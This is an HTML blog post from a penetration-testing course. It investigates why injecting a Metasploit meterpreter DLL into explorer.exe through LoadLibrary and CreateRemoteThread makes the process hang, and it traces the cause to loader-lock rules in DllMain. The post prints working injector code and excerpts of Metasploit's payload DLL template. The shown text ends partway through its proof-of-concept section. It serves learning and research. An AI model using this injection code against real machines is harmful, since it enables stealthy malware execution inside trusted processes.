<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Quite recently, I started working on the PEN-300: Advanced Evasion Techniques and Breaching Defenses course from OffSec. One of the process injection techniques discussed in the Process Injection and Migration chapter is making the remote process load a DLL via LoadLibrary and CreateRemoteThread. In the course, we are requested to inject a DLL generated by msfvenom from the metasploit framework into the explorer.exe process. When running this I noticed that explorer.exe became unstable when the DLL was injected. This blog post goes into the understanding, research and solution I used to solve this issue.
"><title>DllMain and Threads</title><link rel=canonical href=https://reubensammut.github.io/posts/dllmain-and-threads/><link rel=stylesheet href=/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css><meta property="og:title" content="DllMain and Threads"><meta property="og:description" content="Quite recently, I started working on the PEN-300: Advanced Evasion Techniques and Breaching Defenses course from OffSec. One of the process injection techniques discussed in the Process Injection and Migration chapter is making the remote process load a DLL via LoadLibrary and CreateRemoteThread. In the course, we are requested to inject a DLL generated by msfvenom from the metasploit framework into the explorer.exe process. When running this I noticed that explorer.exe became unstable when the DLL was injected. This blog post goes into the understanding, research and solution I used to solve this issue.
"><meta property="og:url" content="https://reubensammut.github.io/posts/dllmain-and-threads/"><meta property="og:site_name" content="Reuben Sammut's blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="dllmain"><meta property="article:tag" content="threads"><meta property="article:tag" content="pen-300"><meta property="article:tag" content="offsec"><meta property="article:tag" content="process injection"><meta property="article:tag" content="loadlibrary"><meta property="article:tag" content="createremotethread"><meta property="article:tag" content="metasploit"><meta property="article:published_time" content="2023-03-26T22:03:06+02:00"><meta property="article:modified_time" content="2023-03-26T22:03:06+02:00"><meta property="og:image" content="https://reubensammut.github.io/posts/dllmain-and-threads/inject.png"><meta name=twitter:site content="@reubensammut"><meta name=twitter:creator content="@reubensammut"><meta name=twitter:title content="DllMain and Threads"><meta name=twitter:description content="Quite recently, I started working on the PEN-300: Advanced Evasion Techniques and Breaching Defenses course from OffSec. One of the process injection techniques discussed in the Process Injection and Migration chapter is making the remote process load a DLL via LoadLibrary and CreateRemoteThread. In the course, we are requested to inject a DLL generated by msfvenom from the metasploit framework into the explorer.exe process. When running this I noticed that explorer.exe became unstable when the DLL was injected. This blog post goes into the understanding, research and solution I used to solve this issue.
"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://reubensammut.github.io/posts/dllmain-and-threads/inject.png"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/avatar_hud6915f437fd61214aa1f45fc1c4e075f_8144_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>üßëüèª‚Äçüíª</span></figure><div class=site-meta><h1 class=site-name><a href=/>Reuben Sammut's blog</a></h1><h2 class=site-description>hello world</h2></div></header><ol class=social-menu><li><a href=https://github.com/reubensammut target=_blank title=Github rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/reubensammut target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About</span></a></li><li><a href=/archives><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ul><li><a href=#motivation>Motivation</a></li><li><a href=#research>Research</a><ul><li><a href=#msdn>MSDN</a></li><li><a href=#metasploit>Metasploit</a></li></ul></li><li><a href=#poc>PoC</a><ul><li><a href=#injectee>Injectee</a></li><li><a href=#samplegood>SampleGood</a></li><li><a href=#samplebad>SampleBad</a></li></ul></li><li><a href=#running-the-poc>Running the PoC</a></li><li><a href=#results>Results</a></li><li><a href=#fix>Fix</a></li><li><a href=#references>References</a></li></ul></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/posts/dllmain-and-threads/><img src=/posts/dllmain-and-threads/inject_hu12a25e6ba988a97bbade249755b091a9_55811_800x0_resize_box_3.png srcset="/posts/dllmain-and-threads/inject_hu12a25e6ba988a97bbade249755b091a9_55811_800x0_resize_box_3.png 800w, /posts/dllmain-and-threads/inject_hu12a25e6ba988a97bbade249755b091a9_55811_1600x0_resize_box_3.png 1600w" width=800 height=239 loading=lazy alt="Featured image of post DllMain and Threads"></a></div><div class=article-details><header class=article-category><a href=/categories/research/>research</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/dllmain-and-threads/>DllMain and Threads</a></h2></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Mar 26, 2023</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>10 minute read</time></div></footer></div></header><section class=article-content><p>Quite recently, I started working on the <a class=link href=https://www.offsec.com/courses/pen-300/ target=_blank rel=noopener>PEN-300: Advanced Evasion Techniques and Breaching Defenses</a> course from OffSec. One of the process injection techniques discussed in the <em>Process Injection and Migration</em> chapter is making the remote process load a DLL via <code>LoadLibrary</code> and <code>CreateRemoteThread</code>. In the course, we are requested to inject a DLL generated by <code>msfvenom</code> from the <a class=link href=https://www.metasploit.com/ target=_blank rel=noopener>metasploit framework</a> into the <code>explorer.exe</code> process. When running this I noticed that explorer.exe became unstable when the DLL was injected. This blog post goes into the understanding, research and solution I used to solve this issue.</p><h2 id=motivation>Motivation</h2><p>As described above, one of the classic techniques taught for process injection, involves using a couple of Win32 APIs to make the remote process load a library whose path is injected into the process. This is done by making the remote process start a thread, executing <code>LoadLibrary</code> with the path of the DLL as a parameter which ends up loading the DLL into the target process. Injecting a DLL generated by <code>msfvenom</code> into <code>explorer.exe</code> is ideal for keeping stealthy (even though writing the DLL to disk is questionable). The code to do so is in the <a class=link href=https://github.com/reubensammut/InjectPoC/tree/master/Injector target=_blank rel=noopener>Injector project</a> which can be found on a <a class=link href=https://github.com/reubensammut/InjectPoC target=_blank rel=noopener>GitHub repository</a> I created as a PoC for this blog post, however the most important part can be found in the code extract below. The code used in the course is written in C#, however for the purposes of this blog post, I wrote everything in C++.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>Inject</span>(<span style=color:#66d9ef>int</span> pid, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> path)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	HANDLE hProc <span style=color:#f92672>=</span> <span style=color:#a6e22e>OpenProcess</span>(PROCESS_ALL_ACCESS, false, pid);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	LPVOID addr <span style=color:#f92672>=</span> <span style=color:#a6e22e>VirtualAllocEx</span>(hProc, NULL, <span style=color:#ae81ff>0x1000</span>, 
</span></span><span style=display:flex><span>		MEM_COMMIT <span style=color:#f92672>|</span> MEM_RESERVE, PAGE_READWRITE);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>size_t</span> nWritten <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>WriteProcessMemory</span>(hProc, addr, path, <span style=color:#a6e22e>strlen</span>(path), <span style=color:#f92672>&amp;</span>nWritten);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	LPTHREAD_START_ROUTINE procAddr <span style=color:#f92672>=</span> (LPTHREAD_START_ROUTINE)<span style=color:#f92672>&amp;</span>LoadLibraryA;
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>CreateRemoteThread</span>(hProc, NULL, <span style=color:#ae81ff>0</span>, procAddr, addr, <span style=color:#ae81ff>0</span>, NULL);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Usually after running <code>LoadLibrary</code>, one would need to run <code>GetProcAddress</code> to locate the address of the function that needs to be executed, and then execute the function with the required parameters. Luckily DLLs have an optional entry point function which is called on <code>LoadLibrary</code>, <code>FreeLibrary</code> and on attach or detach by the first thread of a process. This function is <code>DllMain</code>, the details of which can be found <a class=link href=https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain target=_blank rel=noopener>here</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span>BOOL WINAPI <span style=color:#a6e22e>DllMain</span>( 
</span></span><span style=display:flex><span>	_In_ HINSTANCE hinstDLL, 
</span></span><span style=display:flex><span>	_In_ DWORD fdwReason, 
</span></span><span style=display:flex><span>	_In_ LPVOID lpvReserved 
</span></span><span style=display:flex><span>);
</span></span></code></pre></div><p>The reason for calling this method by the different function is specified in the <code>fdwReason</code> parameter, with <code>DLL_PROCESS_ATTACH</code> being the reason used by <code>LoadLibrary</code>. DLLs like the ones generated by <code>msfvenom</code> execute their payload on DLL load as can be seen in the <a class=link href=https://github.com/rapid7/metasploit-framework/blob/d29f5690a172cbe6741bff9165dc2d133c222ecc/data/templates/src/pe/dll/template.c target=_blank rel=noopener>template</a> used by metasploit to generate DLLs.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span>BOOL WINAPI
</span></span><span style=display:flex><span><span style=color:#a6e22e>DllMain</span> (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>switch</span> (dwReason)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>ExecutePayload</span>();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
</span></span><span style=display:flex><span>			<span style=color:#75715e>// Code to run when the DLL is freed
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
</span></span><span style=display:flex><span>			<span style=color:#75715e>// Code to run when a thread is created during the DLL&#39;s lifetime
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
</span></span><span style=display:flex><span>			<span style=color:#75715e>// Code to run when a thread ends normally.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Using this code to inject a meterpreter DLL into <code>explorer.exe</code>, it was noticed that while the exploit does work, <code>explorer.exe</code> becomes unstable and unresponsive, until it hangs, gets killed and respawned. Although other techniques exist which can be used, it was strange that this was happening.</p><h2 id=research>Research</h2><h3 id=msdn>MSDN</h3><p>Looking at the <a class=link href=https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices target=_blank rel=noopener>Dynamic-Link Library Best Practices</a> documentation, we notice that Microsoft says that there are certain tasks which should not be performed within <code>DllMain</code>. I&rsquo;ve highlighted ones that are particularly interesting to me.</p><blockquote><p>You should never perform the following tasks from within¬†<a class=link href=https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain target=_blank rel=noopener><strong>DllMain</strong></a>:</p><ul><li>Call¬†<a class=link href=https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya target=_blank rel=noopener><strong>LoadLibrary</strong></a>¬†or¬†<a class=link href=https://learn.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa target=_blank rel=noopener><strong>LoadLibraryEx</strong></a>¬†(either directly or indirectly). This can cause a deadlock or a crash.</li><li>&mldr;</li><li>Synchronize with other threads. This can cause a deadlock.</li><li>Acquire a synchronization object that is owned by code that is waiting to acquire the loader lock. This can cause a deadlock.</li><li>&mldr;</li><li>Call¬†<a class=link href=https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa target=_blank rel=noopener><strong>CreateProcess</strong></a>. Creating a process can load another DLL.</li><li>Call¬†<a class=link href=https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibraryandexitthread target=_blank rel=noopener><strong>ExitThread</strong></a>. Exiting a thread during DLL detach can cause the loader lock to be acquired again, causing a deadlock or a crash.</li><li>Call¬†<a class=link href=https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread target=_blank rel=noopener><strong>CreateThread</strong></a>. Creating a thread can work if you do not synchronize with other threads, but it is risky.</li><li>&mldr;</li></ul></blockquote><p>From the documentation of <a class=link href=https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread target=_blank rel=noopener>CreateRemoteThread</a>, we also see the following remark</p><blockquote><p>The¬†<a class=link href=https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-exitprocess target=_blank rel=noopener>ExitProcess</a>,¬†<a class=link href=https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-exitthread target=_blank rel=noopener>ExitThread</a>,¬†<a class=link href=https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread target=_blank rel=noopener>CreateThread</a>,¬†<strong>CreateRemoteThread</strong>¬†functions, and a process that is starting (as the result of a¬†<a class=link href=https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa target=_blank rel=noopener>CreateProcess</a>¬†call) are serialized between each other within a process. Only one of these events occurs in an address space at a time. This means the following restrictions hold:</p><ul><li>During process startup and DLL initialization routines, new threads can be created, but they do not begin execution until DLL initialization is done for the process.</li><li>Only one thread in a process can be in a DLL initialization or detach routine at a time.</li><li><a class=link href=https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-exitprocess target=_blank rel=noopener>ExitProcess</a>¬†returns after all threads have completed their DLL initialization or detach routines.</li></ul></blockquote><p>From these two articles, we can clearly see that:</p><ul><li>there is some sort of lock between <code>ExitProcess</code>, <code>ExitThread</code>, <code>CreateThread</code> and <code>CreateRemoteThread</code> which allows only one event to occur at a time within a process</li><li>using certain functionality from <code>DllMain</code> could cause issues such as deadlocks</li></ul><h3 id=metasploit>Metasploit</h3><p>As we&rsquo;ve seen previously in the <a class=link href=https://github.com/rapid7/metasploit-framework/blob/d29f5690a172cbe6741bff9165dc2d133c222ecc/data/templates/src/pe/dll/template.c target=_blank rel=noopener>DLL template</a>, DLLs generated by metasploit have the <code>DllMain</code> function which calls an <code>ExecutePayload</code> function on <code>DLL_PROCESS_ATTACH</code>. Looking at what the code in <code>ExecutePayload</code>, we see that DLL itself launches a <code>rundll32.exe</code> suspended process, injects shellcode into it and hijacks thread execution in the new process to execute the injected shellcode using <code>GetThreadContext</code> and <code>SetThreadContext</code>. Finally it calls <code>ResumeThread</code> to actually execute the shellcode.</p><p>From the research done and going through the <code>ExecutePayload</code> function, we can highlight the following.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>ExecutePayload</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>	<span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>Synchronize</span>()) {
</span></span><span style=display:flex><span>		<span style=color:#75715e>// Create a suspended process, write shellcode into stack, make stack RWX, 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75715e>// resume it
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		DWORD result <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateProcess</span>(NULL, <span style=color:#e6db74>&#34;rundll32.exe&#34;</span>, NULL, NULL, TRUE, 
</span></span><span style=display:flex><span>			CREATE_SUSPENDED<span style=color:#f92672>|</span>IDLE_PRIORITY_CLASS<span style=color:#f92672>|</span>CREATE_BREAKAWAY_FROM_JOB, NULL, 
</span></span><span style=display:flex><span>			NULL, <span style=color:#f92672>&amp;</span>si, <span style=color:#f92672>&amp;</span>pi);
</span></span><span style=display:flex><span>		<span style=color:#75715e>// If we fail, try again without the CREATE_BREAKAWAY_FROM_JOB flag in the 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75715e>// event that we are in a job but we can&#39;t break away from it.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#66d9ef>if</span> (result <span style=color:#f92672>==</span> FALSE){
</span></span><span style=display:flex><span>			result <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateProcess</span>(NULL, <span style=color:#e6db74>&#34;rundll32.exe&#34;</span>, NULL, NULL, TRUE, 
</span></span><span style=display:flex><span>				CREATE_SUSPENDED<span style=color:#f92672>|</span>IDLE_PRIORITY_CLASS, NULL, NULL, <span style=color:#f92672>&amp;</span>si, <span style=color:#f92672>&amp;</span>pi);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		<span style=color:#75715e>//...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
</span></span><span style=display:flex><span>	<span style=color:#75715e>//...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>ExitThread</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The functions <code>CreateProcess</code> and <code>ExitThread</code> have been highlighted as they could possibly be problematic. The DLL Best Practices documentation tells us that <code>CreateProcess</code> could cause another DLL load. Since no additional information is provided, we will assume that this means that the launched process would also try to load a DLL in our process, via whatever method possible. <code>ExitThread</code> is mentioned in both articles as being possibly problematic. To verify this, we&rsquo;ll create a simplified PoC, where we&rsquo;ll create a thread to load an arbitrary DLL. We&rsquo;ll also create two identical DLLs, one of which returns from the <code>DllMain</code> via <code>return TRUE</code>, while the other one uses <code>ExitThread</code>. We&rsquo;ll see how the application reacts to loading both DLLs, and try to verify that the one with <code>ExitThread</code> causes issues.</p><h2 id=poc>PoC</h2><p>All the code for this PoC can be found <a class=link href=https://github.com/reubensammut/InjectPoC target=_blank rel=noopener>here</a> with the title of each section having the same name as each project in the PoC.</p><h3 id=injectee>Injectee</h3><p>This is the application that will be used to load the DLLs. The application runs in a loop and accepts keyboard input. It accepts two commands</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>Usage:
</span></span><span style=display:flex><span>        load &lt;dllname&gt;  Loads a dll into the process
</span></span><span style=display:flex><span>        exit            Exit the process
</span></span></code></pre></div><p>When calling <code>load &lt;dllname></code>, a thread is created which loads the specified DLL as follows</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span>DWORD WINAPI <span style=color:#a6e22e>myThread</span>(LPVOID lpParameter)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> libPath <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)lpParameter;
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;[Thread] - Trying to load library&#34;</span> <span style=color:#f92672>&lt;&lt;</span> endl;
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	HMODULE hLib <span style=color:#f92672>=</span> <span style=color:#a6e22e>LoadLibraryA</span>(libPath);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>FreeLibrary</span>(hLib);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	delete[] libPath;
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We also call <code>FreeLibrary</code> to be able to load a library multiple times.</p><h3 id=samplegood>SampleGood</h3><p><code>SampleGood</code> is a DLL, which does not use any functions which could be problematic. The code for <code>DLL_PROCESS_ATTACH</code> just prints two statements, and looks as follows</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>DoStuff</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Hello world from a good DLL :)</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Returning normally</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>As we see from the code of DllMain, the function returns TRUE once <code>DoStuff</code> is done.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span>BOOL APIENTRY <span style=color:#a6e22e>DllMain</span>( HMODULE hModule,
</span></span><span style=display:flex><span>						DWORD ul_reason_for_call,
</span></span><span style=display:flex><span>						LPVOID lpReserved
</span></span><span style=display:flex><span>					)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>switch</span> (ul_reason_for_call)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>DoStuff</span>();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[SampleGood.dll] - DLL_THREAD_ATTACH</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[SampleGood.dll] - DLL_THREAD_DETACH</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[SampleGood.dll] - DLL_PROCESS_DETACH</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
